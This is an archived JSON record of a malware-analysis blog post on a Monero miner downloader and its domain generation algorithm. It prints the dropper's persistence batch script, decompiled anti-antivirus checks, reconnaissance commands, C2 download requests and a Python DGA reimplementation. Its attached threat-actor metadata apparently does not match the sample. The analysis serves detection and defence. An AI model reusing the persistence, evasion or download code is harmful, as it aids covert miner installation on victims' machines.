{
    "id": "9e130c0a-7781-44ae-9ab1-4bb8f05b8cc2",
    "created_at": "2023-01-12T15:07:56.455701Z",
    "updated_at": "2025-03-27T02:05:30.89933Z",
    "deleted_at": null,
    "sha1_hash": "4fdacb5807351635f2f1b9658909199845273c4f",
    "title": "2020-01-23 - The DGA of a Monero Miner Downloader",
    "authors": "",
    "file_creation_date": "2022-05-27T21:08:34Z",
    "file_modification_date": "2022-05-27T21:08:34Z",
    "file_size": 995266,
    "plain_text": "# The DGA of a Monero Miner Downloader\n\n**[johannesbader.ch/blog/the-dga-of-a-monero-miner-downloader/](https://johannesbader.ch/blog/the-dga-of-a-monero-miner-downloader/)**\n\nThis blog posts deals with a domain generation algorithm (DGA) with exotic top levels like\n_.tickets, .blackfriday or .feedback. Among others,_ [Bert Hubert noticed the DGA domains and](https://twitter.com/powerdns_bert/status/1061373028108550144)\nposted them on Twitter:\n\n\n-----\n\n[Paul Melson associated one of the domains with a Monero Miner:](https://twitter.com/pmelson/status/1035361639703474178)\n\n\n-----\n\nI found [this sample, which produces these domains](https://www.virustotal.com/gui/file/e82c95edb680fd6a88b73eb8389759f03aebfcb70e081ecb259ea738e16f8cdd)\n\n**MD5**\n39c8620827ab6005e57e9e9f172d47ff\n\n**SHA1**\n239a7a6ea5155b1863815f595841d00cb0feec46\n\n**SHA256**\ne82c95edb680fd6a88b73eb8389759f03aebfcb70e081ecb259ea738e16f8cdd\n\n**Size**\n7734 KB, 7919356 Bytes\n\nThe executable is a Nullsoft installer that drops three files:\n\n\n-----\n\n```\nPowerISO6-Full.exe\n\n```\n[This could be cracked version of PowerISO 6, with potentially additional malware. I didn’t](http://10.10.0.46/%60%60https://www.virustotal.com/gui/file/116ad175dc68890055756438acb70d2c927abc535becbc556738f9b537d8c1db/detection%60%60)\nanalyse the file. (MD5: `31594d28c74f367073ba17acea9809f6 )`\n```\nsvchostc.exe\n\n```\nThe actual malware that this post is about. (MD5: `1d47bd7706b2032aa41257c92cb0e3b1 )`\n```\nlauncher.bat\n\n```\nAn install script to copy `svchostc.exe to the local appdata and to create a scheduled task`\nto run it on reboot (MD5: `31c740ee5ebd975decd8345baa5ff4e6 ).`\n\nThe `launcher.bat copies the malware to the local AppData folder and creates a`\nscheduled task to run the binary `svchostc.exe when the client starts (after a 10 minute`\ndelay):\n```\n@echo off\necho \"PATCHING...\"\nset installpath=%~1\nif not exist \"%LOCALAPPDATA%\\svchostc\\\" mkdir %LOCALAPPDATA%\\svchostc\\ >nul 2>&1\nmove \"%installpath%\\svchostc.exe\" \"%LOCALAPPDATA%\\svchostc\\svchostc.exe\" >nul 2>&1\nschtasks /create /tn svchostc /sc ONSTART /DELAY 0010:00 /RL HIGHEST →\n /tr \"%LOCALAPPDATA%\\svchostc\\svchostc.exe\" /f >nul 2>&1\nstart \"\" \"%LOCALAPPDATA%\\svchostc\\svchostc.exe\"\n(goto) 2>nul & del \"%~f0\"\n\n```\nYou find the artifacts of an actual infection – including the `svchostc.exe – in` this GitHub\nrepository. None of the generated C2 DGA domains currently delivers any payload, but both\nthe artifacts in the GitHub repository, as well as the tweet by Paul Melson, hint a dropped\nMonero miner.\n\n## About the Downloader\n\n\n-----\n\nI did not find any public reports of the downloader `svchostc.exe`\n( 1d47bd7706b2032aa41257c92cb0e3b1 ), and even though the sample is classified as\nmalicious by many AV products, they only give it generic names. While trying to find other\nsamples, I stumbled upon this executable:\n\n**MD5**\na4c3e4634219a9be12aebaebd91c75fa\n\n**SHA1**\n59ffcd2bc41206ec4e4d2609b818a8e8cc1ec677\n\n**SHA256**\n2a821ee54d13c9d83909f1fadc283b9340e3f024cac36e97b29f88a94274788e\n\n**Size**\n23213 KB, 23769216 Bytes\n\nMany AV call this sample `Riskware or` `Not-a-virus . The sample has very similar`\nfunctionality, but differs in the C2 communication, most notably it does not have a DGA. I will\nstill include it in the discussion of the malware.\n\nBoth samples are written in C++ and don’t have their debug information stripped (as\n```\nDWARF ). I will therefore use the original names of the functions given by the malware\n\n```\nauthors.\n\nBoth samples perform four steps:\n\n1. Check for AV software and exit if one is detected.\n2. Collect system information.\n3. Contact C2 servers to download the actual malware.\n4. Make sure the downloaded malware is running, restarting it if necessary.\n\n### Step 1: Anti AV\n\nBoth samples use the same anti AV emulation checks, which they call avTests. All tests are\ntaken from the paper [“Bypass Antivirus Dynamic Analysis” by Emeric Nasi from August](https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf)\n2014. In total there are six tests a to f. If any test returns True, the malware sleeps 10\nseconds and exits.\n\n**a - flsTest**\n\nThis is the test Example 2: What the fuck are FLS?:\n```\nbool flsTest(void)\n{\n return FlsAlloc(0i64) != FLS_OUT_OF_INDEXES;\n}\n\n```\n\n-----\n\n**b - winApiTest**\n\nThis is the test Example 1: What the fuck is NUMA?:\n```\nbool winApiTest(void)\n{\n HANDLE hProcess; // rax\n hProcess = GetCurrentProcess();\n return VirtualAllocExNuma(hProcess, 0i64, 1000ui64, MEM_COMMIT | MEM_RESERVE,\nPAGE_EXECUTE_READWRITE, 0) != 0i64;\n}\n\n```\n**c - timeDistortionTest**\n\nThis is the test Example 2: Time distortion:\n```\n_BOOL8 timeDistortionTest(void)\n{\n DWORD ticks_after; // [rsp+28h] [rbp-8h]\n DWORD ticks_before; // [rsp+2Ch] [rbp-4h]\n ticks_before = GetTickCount();\n Sleep(1000u);\n ticks_after = GetTickCount();\n return ticks_before + 1000 <= ticks_after && ticks_before + 1500 >= ticks_after;\n}\n\n```\n**d - systemProcessTest**\n\nThis is the test Example 1: Attempt to open a system process:\n```\nbool systemProcessTest(void)\n{\n return OpenProcess(PROCESS_ALL_ACCESS, 0, 4u) == 0i64;\n}\n\n```\n**e - incrementTest**\n\nThis is the test Example 2: Hundred million increments:\n```\nbool incrementTest(void)\n{\n int i; // [rsp+8h] [rbp-8h]\n int cpt; // [rsp+Ch] [rbp-4h]\n cpt = 0;\n for ( i = 0; i <= 99999999; ++i )\n  ++cpt;\n return cpt == 100000000;\n}\n\n```\n**f - memoryTest**\n\n\n-----\n\nThis is the test Example 1: Allocate and fill 100M memory:\n```\n__int64 memoryTest(void)\n{\n void *Block; // [rsp+28h] [rbp-8h]\n Block = malloc(100000000ui64);\n if ( !Block )\n  return 0i64;\n memset(Block, 0, 100000000ui64);\n free(Block);\n return 1i64;\n}\n\n### Step 2: Collect System Information\n\n```\nThe DGA sample only collects two pieces of information:\n\nThe number of processors of the infected system (with `GetSystemInfo ).`\nThe installed version of the Monero miner.\n\nThe version of the miner is saved as a filename in the directory\n```\nCSIDL_LOCAL_APPDATA\\svchostc, for example in\nC:\\Users\\User\\AppData\\Local\\svchostc . The filename has the format wincache<nr>,\n\n```\nwhere `<nr> is the version number (as an integer). An example of such a file can be seen in`\n[the aforementioned GitHub repository with artifacts:](https://github.com/bisho1995/MalwareAnalysis-Miner/blob/master/LOCALAPPDATA/svchostc)\n\nIn this case the version number would be 15. The version number and the number of\nprocessors are then stored in a string `;v:<version>;c:<nrofprocessors>, e.g.,`\n```\n;v:15;c:2, which is then base64-encoded (e.g., O3Y6MTU7YzoyIC1uCg== ).\n\n```\nThe Tor-based downloader generates a much more detailed system report, by running the\nfollowing commands:\n```\n   cmd.exe /c \"(wmic computersystem get /format:list)\n   cmd.exe /c \"(wmic cpu get /format:list)\n   cmd.exe /c \"(wmic memorychip get /format:list)\n   cmd.exe /c \"(wmic path Win32_VideoController get /format:list)\n   cmd.exe /c \"(wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2\n   Path AntiVirusProduct Get /format:list)\n\n```\n\n-----\n\n```\ncmd.exe /c (wmic nicconfig get /format:list)\n\n```\n\n### Step 3: Downloading the Malware\n\nThe Tor-based downloader comes with Tor version 0.3.3.7, which it installs to\n```\n%LOCALAPPDATA%\\Temp\\ . It then tries to contact http://www.google.com over Proxy\n127.0.0.1:9050 to see if Tor is running. Otherwise it will try to reinstall the software until\n\n```\nthe connection to Google over Tor succeeds.\n\nThe malware then tries to download the payload from two domains on an alternating basis:\n```\n   asxe4d2fmz7ji5ux.onion\n   dyvt2mleg33f6zdb.onion\n\n```\nThe DGA based malware does not use Tor, and uses algorithmically generated domains, as\ndescribed in Section DGA.\n\nThe next steps are almost identical for both variants. I’m only presenting the DGA-based\nversion. First, the malware sends the system information to a file called `hello.php with a`\nsimple HTTP GET request:\n```\nGET /hello.php?info=O3Y6MDtjOjI= HTTP/1.1\nHost: 31b4bd31fg1x2.org\nConnection: close\n\n```\nThe response either needs to have a `Content-Length HTTP-header, or it needs to set the`\nlength of the payload as the first line after optional http headers. The length is stored as text,\nan interpreted as base 16.\n\nAfter that follows a 512 byte RSA signature, and then the signed content, which is just an\ninteger version number stored as text:\n```\n<length>\\r\\n\n<512 Bytes signature>\n<version nr>\n\n```\nThe signature is verified with the following RSA key:\n\n\n-----\n\n```\n30820120300D06092A864886F70D01010105000382010D003082010\n80282010100B5E3FE072C644E09E276C48C43DF8944FB9DE98641F9\nFA24785B1217581924299D5CBFF5FFA803A5A88F54142E9124E41BA\n2E9AE6862D5542D7592846E853F5C04AEC33550CB8023CE9780E15B\n4B6E1C92F61683E0D387A6DC610DEF52AEE75D99706EA7AF7D9C465\nF97F14C9E2BA42BBE4735124AE08BA70962FA3DED1EDC5571644B0F\n6659671AED866164255D229946002D4A7C1D5B360410132EB5801AB\n985506316708170D749362E4B0E8B825EF358A2FA87601DE49E27E8\n9F728E09D6FEAC1005F69BCDE8E63BEC25B3ED1664B29480501FAD3\nE9F3D043894A1D4751FFD4ACE00E403D5D1911C98CAFC54074CA04D\n126AEE24A4173625D57D3DD44E2F020111\n\n```\nIf the signature of the version number is OK, and the version is greater than an already\ninstalled miner, then a second HTTP request is made:\n```\nGET /binary HTTP/1.1\nHost: 31b4bd31fg1x2.org\nConnection: close\n\n```\nThe response has the same format as before, but instead of the version number, an\nunencrypted archive is delivered with the malware.\n\n## The DGA\n\nThe DGA-based malware is very noisy. It generates an infinte number of domains until it gets\na valid signed payload:\n\n\n-----\n\nThe downloader has five top level domains:\n```\n   .org\n   .tickets\n   .blackfriday\n   .hosting\n   .feedback\n\n```\nEach of the tld is passed to a separated thread that generates the second level domain and\nthen performs the download operation discussed before.\n\n\n-----\n\nThe DGA generates up to 500 second level domains per day (i.e., 2500 different domains),\ngoing back in time if the number is exhausted. The first domain per day is special, as it is\nalways using the hardcoded second level domain `31b4bd31fg1x2 . The remaining 499`\ndomains are generated as follows:\n\n1. Determine the number of days since epoch (1.1.1970)\n2. Join a hardcoded magic string ( jkhhksugrhtijys78g46 ), the number of days since\n\nepoch, and the current domain nr (1 to 499) with dashes “-”. For example\n```\n   jkhhksugrhtijys78g46-18243-1 .\n\n```\n3. MD5-hash the string, e.g., `00120343a5dc7d2e4e11938b0e1fed43`\n4. Use the first 13 letters of the hash as the second level domain, and add the top level\n\ndomain for the thread, e.g., `00120343a5dc7.org`\n\nThe following reimplementation in Python illustrates the domain generating procedure.\n\n### Python Reimplementation\n\n\n-----\n\n```\nfrom datetime import datetime\nimport hashlib\nimport argparse\ntlds = [\n  \".org\",\n  \".tickets\",\n  \".blackfriday\",\n  \".hosting\",\n  \".feedback\",\n]\nmagic = \"jkhhksugrhtijys78g46\"\nspecial = \"31b4bd31fg1x2\"\ndef dga(date, back=0):\n  epoch = datetime(1970, 1, 1)\n  days_since_epoch = (date - epoch).days\n  days = days_since_epoch\n  for j in range(back+1):\n    for nr in range(500):\n      for tld in tlds:\n        seed = \"{}-{}-{}\".format(magic, days, nr)\n        m = hashlib.md5(seed.encode('ascii')).hexdigest()\n        mc = m[:13]\n        if nr == 0:\n          sld = special\n        else:\n          sld = mc\n        domain = \"{}{}\".format(sld, tld)\n        yield domain\n    days -= 1\nif __name__ == \"__main__\":\n  parser = argparse.ArgumentParser()\n  parser.add_argument(\"-d\", \"--date\", help=\"date when domains are generated\")\n  args = parser.parse_args()\n  if args.date:\n    d = datetime.strptime(args.date, \"%Y-%m-%d\")\n  else:\n    d = datetime.now()\n  for domain in dga(d):\n    print(domain)\n\n```\nFor example, the domains shown in the screenshot of the Tweets are from April 10th, 2018,\nand can be generated as follows:\n```\npython3 dga.py --date 2018-04-10\n\n### Characteristics\n\n```\n\n-----\n\nThe DGA has these properties:\n\n**type**\nTDD (time-dependent deterministic)\n\n**generation scheme**\nMD5 hashing\n\n**seed**\ncurrent date and magic string\n\n**domain change frequency**\n1 day\n\n**domains per day**\n499 (+1 hardcoded)\n\n**sequence**\neach tld runs in separate thread, within which the domains are generated sequentially\n\n**wait time between domains**\nnone\n\n**top level domains:**\n.org, .tickets, .blackfriday, .hosting, .feedback\n\n**second level characters**\na-z0-f\n\n**second level domain length**\n13\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-23 - The DGA of a Monero Miner Downloader.pdf"
    ],
    "report_names": [
        "2020-01-23 - The DGA of a Monero Miner Downloader.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536076,
    "ts_updated_at": 1743041130,
    "ts_creation_date": 1653685714,
    "ts_modification_date": 1653685714,
    "files": {
        "pdf": "https://archive.orkl.eu/4fdacb5807351635f2f1b9658909199845273c4f.pdf",
        "text": "https://archive.orkl.eu/4fdacb5807351635f2f1b9658909199845273c4f.txt",
        "img": "https://archive.orkl.eu/4fdacb5807351635f2f1b9658909199845273c4f.jpg"
    }
}